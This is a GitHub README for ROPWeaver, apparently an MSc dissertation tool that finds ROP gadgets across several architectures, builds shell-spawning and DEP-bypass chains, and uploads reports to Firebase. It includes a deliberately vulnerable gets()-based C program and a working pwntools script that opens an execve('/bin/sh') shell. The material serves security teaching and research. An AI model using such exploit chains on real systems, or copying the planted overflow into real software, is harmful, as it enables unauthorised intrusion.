# ROPWeaver 🧵⚔️

**Automated Return-Oriented Programming (ROP) Exploit Synthesizer & Multi-ISA Binary Analysis Platform**

[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-00ff88.svg)](#cross-platform-architecture)
[![Architectures](https://img.shields.io/badge/ISA-x86%20%7C%20x86__64%20%7C%20ARMv7%20%7C%20AArch64%20%7C%20RISC--V-00d2ff.svg)](#multi-architecture-support)
[![Binary Formats](https://img.shields.io/badge/Formats-ELF%20%7C%20PE%20%7C%20Mach--O%20%7C%20RAW-ff9900.svg)](#binary-format-parsers)
[![Cloud Registry](https://img.shields.io/badge/Cloud-Firebase%20Firestore-ffca28.svg)](#cloud-telemetry--web-explorer)
[![License](https://img.shields.io/badge/License-MIT%20%2F%20Academic-9d4edd.svg)](#license)

> **Oxford Brookes University • Master of Science Dissertation Research**  
> **Course:** COMP7039 (Faculty of Technology, Design and Environment)  
> **Dissertation Title:** *"Constructing a tool for building Return Oriented Programming exploits"*  
> **Author:** Chrisbin Thomas (Student ID: 19274867 / GitHub: [@chrisbin95](https://github.com/chrisbin95))  
> **Supervisor:** Ian Bayley • **Date:** 31/05/2025

---

## 📖 Executive Summary

Return-Oriented Programming (ROP) is an essential class of code-reuse attacks that circumvents modern memory mitigations such as **Non-Executable (NX / DEP)** memory and **Address Space Layout Randomization (ASLR)**. By identifying and chaining short assembly instruction sequences ending in returns (`ret`, `syscall`, `svc`, or `jalr`), an adversary or security analyst can redirect control flow to execute arbitrary computation without injecting new executable code.

While foundational tools like *ROPgadget* extract gadgets and frameworks like *Angr* provide symbolic execution, existing tools have historically suffered from steep learning curves, excessive resource usage, or a lack of unified cross-architecture synthesis and runtime simulation.

**ROPWeaver** bridges this gap: a lightweight, high-performance C++ toolchain combined with a real-time reactive cloud registry. It automates gadget extraction across **x86, x86_64, ARMv7, AArch64, and RISC-V**, performs automated semantic categorization, synthesizes full ROP chains (such as `sys_execve` shell spawns and Windows `VirtualProtect` DEP bypasses), and enables distributed security auditing via **Google Firebase Firestore** and an interactive **React web dashboard**.

---

## 🔍 Key Capabilities

1. **Multi-Architecture Gadget Discovery Engine**
   - High-performance disassembly powered by **Capstone Engine**.
   - Supports **x86 (32-bit)**, **x86_64**, **ARMv7 (32-bit Thumb/ARM)**, **AArch64 (64-bit)**, and **RISC-V (RV64GC / RV32)**.
   - RAW firmware and bare-metal microcontroller mode (STM32, ESP32) with configurable base addresses.

2. **Universal Native Binary Parsers**
   - **Linux & Android**: Native ELF parser (32-bit & 64-bit).
   - **Windows**: Portable Executable (PE32 & PE32+ `.exe` / `.dll`).
   - **macOS / iOS**: Mach-O (`__TEXT,__text` load commands).
   - **RAW Flat Blobs**: Direct linear and iterative analysis without container headers.

3. **Semantic Gadget Categorization**
   - Automatically parses instruction semantics and groups primitives into:
     - `> syscall`: Kernel traps (`syscall`, `sysenter`, `int 0x80`, `svc #0`, `ecall`).
     - `> pop`: Register load staging (`pop rdi ; ret`, `pop rsi ; ret`, etc.).
     - `> load reg / write mem`: Memory pointer dereference (`mov [rdi], rsi`, `ldr x0, [sp]`).
     - `> stack pivoting`: Stack redirection primitives (`xchg esp, eax ; ret`, `leave ; ret`).
     - `> call / jmp`: Indirect branch control.

4. **Automated Exploit Chain Synthesis**
   - Evaluates available registers and automatically organizes functional ROP chains.
   - Automatic 16-byte stack alignment insertion (satisfies SSE `MOVAPS` requirements on Linux x86_64).
   - Prepares parameter staging for Linux `sys_execve("/bin/sh", 0, 0)` and Windows Win64 `VirtualProtect` API.

5. **Binary Hardening & Defense Inspector**
   - Detects the presence of:
     - **NX / DEP**: Non-Executable Stack (`GNU_STACK` flag / `IMAGE_DLLCHARACTERISTICS_NX_COMPAT`).
     - **Stack Canaries**: Canary cookies (`__stack_chk_fail` / `GS`).
     - **PIE / ASLR**: Position Independent Executables / Dynamic Base.
     - **RELRO**: Relocation Read-Only (None, Partial, Full).

6. **Cloud Collaboration & Web Dashboard**
   - Native C++ `libcurl` REST client securely publishes gadget catalogs and exploit reports to **Firebase Firestore**.
   - Responsive **React web application** with live Firestore querying, gadget pattern search, report download (`.txt`), and a multi-OS developer guide.

---

## 🏗️ System Architecture

```
                          ┌───────────────────────────┐
                          │   Target Binary File      │
                          │ (ELF / PE / Mach-O / RAW) │
                          └─────────────┬─────────────┘
                                        │
                                        ▼
                          ┌───────────────────────────┐
                          │    Architecture Detector  │
                          │  & Native Format Parsers  │
                          └─────────────┬─────────────┘
                                        │
                                        ▼
                          ┌───────────────────────────┐
                          │      Capstone Engine      │
                          │  Multi-ISA Disassembler   │
                          └─────────────┬─────────────┘
                                        │
                                        ▼
                          ┌───────────────────────────┐
                          │       Gadget Finder       │
                          │   & Semantic Classifier   │
                          └──────┬─────────────┬──────┘
                                 │             │
                 ┌───────────────┘             └───────────────┐
                 ▼                                             ▼
   ┌───────────────────────────┐                 ┌───────────────────────────┐
   │    Chain Builder Engine   │                 │    Hardening Inspector    │
   │  (sys_execve / DEP pivot) │                 │  (NX, PIE, Canary, RELRO) │
   └─────────────┬─────────────┘                 └─────────────┬─────────────┘
                 │                                             │
                 └──────────────────────┬──────────────────────┘
                                        │
                                        ▼
                          ┌───────────────────────────┐
                          │ Telemetry & Report Gen    │
                          │ (output.json / Raw PoC)   │
                          └──────┬─────────────┬──────┘
                                 │             │
                Local File Export│             │Native libcurl REST
                                 ▼             ▼
                     ┌───────────────┐   ┌───────────────────────────┐
                     │ reports/*.json│   │  Google Firebase Database │
                     └───────────────┘   └─────────────┬─────────────┘
                                                       │
                                                       ▼
                                         ┌───────────────────────────┐
                                         │  ROPWeaver Cloud Explorer │
                                         │  (React & Vite Web App)   │
                                         └───────────────────────────┘
```

---

## 📂 Directory Layout

```
ROPWeaver/
├── core/                        # Core C++ Analysis Engine
│   ├── arch_detector.cpp/.h     # ISA and endianness identification
│   ├── chain_builder.cpp/.h     # Automated ROP chain synthesizer
│   ├── gadget.cpp/.h            # Gadget representation & filtering
│   ├── gadget_finder.cpp/.h     # Backward traversal gadget discovery
│   ├── payload_gen.cpp/.h       # Telemetry report & exploit assembly
│   ├── utils.cpp/.h             # Hex dumps, formatting, SHA-256
│   └── parsers/                 # Native binary format parsers
│       ├── elf_parser.cpp/.h    # Linux ELF32/ELF64 parser
│       ├── pe_parser.cpp/.h     # Windows PE32/PE32+ parser
│       ├── macho_parser.cpp/.h  # macOS Mach-O 64-bit parser
│       └── elf_defs.h           # Architecture ELF constants
├── firebase/                    # Cloud Storage Subsystem
│   ├── firebase_uploader.cpp/.h # Native libcurl Firestore REST uploader
│   └── certs/                   # TLS root certificates (curl-ca-bundle)
├── ui/                          # User Interfaces
│   ├── cli.cpp/.h               # High-speed command-line interface
│   └── qt_gui.cpp/.h            # Optional Qt desktop interface
├── web-react/                   # Cloud Explorer & Developer Dashboard
│   ├── src/
│   │   ├── components/          # Navbar, Footer, LazyList, ReportCard, etc.
│   │   ├── pages/               # ExplorerPage, DownloadPage, HowtoPage, SearchPage, AboutPage
│   │   ├── firebase/            # Firebase SDK configuration
│   │   ├── App.jsx              # Hash routing & main state
│   │   └── App.css              # Cyber-themed styling & mobile responsiveness
│   ├── package.json             # React 18, Vite, Lucide Icons
│   └── vite.config.js
├── test_binaries/               # Sample vulnerable benchmarks (p3, test, binsh_test)
├── reports/                     # Generated exploit telemetry reports (output.json)
├── config/                      # Firebase & security rules configurations
├── CMakeLists.txt               # Cross-platform CMake build script
├── Makefile                     # Standard GNU Makefile
└── README.md                    # Project documentation
```

---

## 🚀 Quickstart & Installation

### 1. Prerequisites

#### Linux (Debian / Ubuntu / Kali Linux)
```bash
sudo apt-get update
sudo apt-get install -y build-essential cmake gcc g++ libcapstone-dev libcurl4-openssl-dev python3 python3-pip
pip3 install pwntools
```

#### Windows (MinGW-w64 / MSVC)
- Install **MinGW-w64** or **Visual Studio 2022 Build Tools**.
- Install **LLVM/Clang** and **CMake**.
- Install **Node.js 18+** for the web dashboard.

#### macOS
```bash
brew install cmake capstone curl node
```

---

### 2. Building the C++ CLI Engine

```bash
# Clone the repository
git clone https://github.com/chrisbin95/ROPWeaver.git
cd ROPWeaver

# Create build directory and compile
mkdir build && cd build
cmake ..
cmake --build . --config Release

# Verify installation
./ropweaver --help
```

---

### 3. Running the React Cloud Dashboard

```bash
cd web-react

# Install frontend dependencies
npm install

# Run local development server
npm run dev

# Or build optimized production bundle
npm run build
npm run preview
```

Open **`http://localhost:5173/`** in your browser to access the Cloud Explorer.

---

## 💻 CLI Command Line Reference

```bash
# 1. Disassemble and list gadgets in an ELF or PE binary
./ropweaver target.elf --list-gadgets --depth 5

# 2. Search for specific register staging primitives
./ropweaver target.elf --search "pop rdi ; ret"

# 3. Categorize gadgets and suggest chain candidates
./ropweaver target.elf --suggest-gadgets

# 4. Automatically synthesize an execve("/bin/sh") ROP chain
./ropweaver target.elf --auto-chain --target-syscall execve

# 5. Inspect binary hardening mitigations (NX, PIE, Canary, RELRO)
./ropweaver target.elf --inspect-protections

# 6. Upload telemetry report to Firebase Cloud Datastore
./ropweaver target.elf --auto-chain --upload-report

# 7. Disassemble raw microcontroller firmware with custom base address
./ropweaver firmware.bin --raw --arch arm --base-addr 0x08000000 --list-gadgets
```

---

## 🛡️ Binary Hardening & Defense Mitigation Matrix

ROPWeaver includes a native mitigation detector that inspects binary headers and reports exploitability:

| Mitigation | Security Purpose | Disabling Flag for Lab Benchmarks | ROP Bypass Strategy |
| :--- | :--- | :--- | :--- |
| **NX / DEP** | Prevents execution on stack and heap ($W \oplus X$) | `-z execstack` (GCC) / `/NXCOMPAT:NO` (MSVC) | Chain existing executable code sequences ending in `ret`. |
| **Stack Canary** | Guard value detecting buffer overwrites | `-fno-stack-protector` (GCC) / `/GS-` (MSVC) | Information leak to recover cookie or target return address directly. |
| **PIE / ASLR** | Randomizes virtual memory bases on execution | `-no-pie` (GCC) / `/DYNAMICBASE:NO` (MSVC) | Information leak to calculate base offset or partial overwrites. |
| **RELRO** | Marks Global Offset Table (GOT) read-only | `-Wl,-z,norelro` (GCC) | Target stack return pointers instead of modifying GOT entries. |

---

## 🧪 Interactive Vulnerable C Code Playground

The tool includes educational vulnerable harnesses in `test_binaries/` and documented in the interactive Developer Guide:

### `classic_bof.c` (Standard Buffer Overflow Target)
```c
#include <stdio.h>
#include <stdlib.h>

char binsh_str[] = "/bin/sh";

void vulnerable_function() {
    char buffer[64];
    printf("[+] Enter input: ");
    gets(buffer); // Vulnerable unbound input
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ROPWeaver Benchmark Binary ===\n");
    printf("[i] Target /bin/sh string at: %p\n", binsh_str);
    vulnerable_function();
    return 0;
}
```
**Compilation:**
```bash
gcc -fno-stack-protector -no-pie -z noexecstack -O0 -g classic_bof.c -o classic_bof
```

### Automated Pwntools Exploit Script (`exploit.py`)
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process('./classic_bof')

# Gadget addresses discovered by ROPWeaver
POP_RDI     = 0x0040115b   # pop rdi ; ret
POP_RSI_RDX = 0x0040115d   # pop rsi ; pop rdx ; ret
POP_RAX     = 0x00401159   # pop rax ; ret
SYSCALL     = 0x00401160   # syscall
BINSH_ADDR  = 0x00404028   # Pointer to "/bin/sh"

OFFSET = 72

rop = b""
rop += p64(POP_RDI)     + p64(BINSH_ADDR)
rop += p64(POP_RSI_RDX) + p64(0x0) + p64(0x0)
rop += p64(POP_RAX)     + p64(0x3b) # sys_execve
rop += p64(SYSCALL)

payload = b"A" * OFFSET + rop
p.sendlineafter(b"Enter input: ", payload)
p.interactive()
```

---

## ⚖️ Ethical & Legal Compliance

ROPWeaver is strictly designed for **academic cybersecurity research, defensive vulnerability evaluation, training, and Capture-the-Flag (CTF) challenges**. 

* In accordance with the **ACM Code of Ethics**, users must never deploy ROP chains or audit binaries on production systems without explicit, documented authorization.
* ROPWeaver does not ship pre-packaged malicious exploit payloads; all synthesis is performed against user-supplied local binaries.

---

## 📚 References & Academic Literature

1. **Shacham, H. (2007).** *The geometry of innocent flesh on the bone: Return-into-libc without function calls (on the x86).* Proceedings of the 14th ACM Conference on Computer and Communications Security (CCS '07), pp. 552–561.
2. **Checkoway, S., et al. (2010).** *Return-oriented programming without returns.* Proceedings of the 17th ACM Conference on Computer and Communications Security, pp. 559–572.
3. **Chougale, P., Yadav, V., Gaikwad, A. and Vidyapeeth, B. (2021).** *Firebase - overview and usage.* International Research Journal of Modernization in Engineering Technology and Science, 3(12), pp. 1178–1183.
4. **Sun, X., et al. (2023).** *Security and Privacy in Embedded Systems: A Survey of Recent Developments.* Micromachines, 14(8), p. 1525.
5. **Jonathan Salwan.** *ROPgadget Tool Repository* — [https://github.com/JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
6. **Angr Binary Analysis Platform** — [https://github.com/angr/angr](https://github.com/angr/angr)
7. **Gallopsled.** *Pwntools CTF Framework & Exploit Library* — [https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools)
8. **Bittau, A., et al. (2014).** *Hacking Blind (BROP).* Stanford University — [https://www.scs.stanford.edu/brop/](https://www.scs.stanford.edu/brop/)
9. **Capstone Disassembly Engine** — [https://www.capstone-engine.org/](https://www.capstone-engine.org/)

---

## 👨‍💻 Maintainer & Contact

- **Author:** Chrisbin Thomas
- **Institution:** Oxford Brookes University (MSc Dissertation, COMP7039)
- **Email:** [chrisbin95@gmail.com](mailto:chrisbin95@gmail.com)
- **GitHub:** [https://github.com/chrisbin95/ROPWeaver.git](https://github.com/chrisbin95/ROPWeaver.git)

---

## 📄 License

This project is licensed under the **MIT License** for academic and research purposes. See `LICENSE` for details.
